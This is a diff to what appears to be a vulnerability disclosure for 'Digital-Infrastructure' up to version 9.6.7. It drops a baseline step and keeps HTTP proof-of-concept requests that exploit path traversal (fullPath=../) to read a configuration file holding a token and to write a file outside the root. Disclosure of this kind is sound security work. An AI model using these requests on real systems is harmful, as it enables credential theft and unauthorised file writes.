@@ -18,20 +18,8 @@ Digital-Infrastructure ≤ 9.6.7 (current)
 
 ## Vulnerability Reproduction
 
-**Step 1** — read a file inside the configured root (baseline):
 
-```http
-GET /rest/retrieveFileStream?fullPath=&fileName=hello.txt HTTP/1.1
-Host: <target>
-```
-
-Response :
-
-```text
-in-root file, nothing sensitive
-```
-
-**Step 2** — **path-traversal READ** (`fullPath=../`) reads a sensitive file outside the root:
+**Step 1** — **path-traversal READ** (`fullPath=../`) reads a sensitive file outside the root:
 
 ```http
 GET /rest/retrieveFileStream?fullPath=../&fileName=secret-conf.properties HTTP/1.1
@@ -48,7 +36,7 @@ admin.token=repro_secret
 db=km_businesss_dev
 ```
 
-**Step 3** — **path-traversal WRITE** (`/rest/storeFile`, `fullPath=../`) writes an arbitrary file outside the root:
+**Step 2** — **path-traversal WRITE** (`/rest/storeFile`, `fullPath=../`) writes an arbitrary file outside the root:
 
 ```http
 POST /rest/storeFile HTTP/1.1
@@ -80,7 +68,7 @@ Response :
 success
 ```
 
-**Step 4** — read the written file back to confirm the out-of-root write:
+**Step 3** — read the written file back to confirm the out-of-root write:
 
 ```http
 GET /rest/retrieveFileStream?fullPath=../&fileName=pwned-conf.properties HTTP/1.1
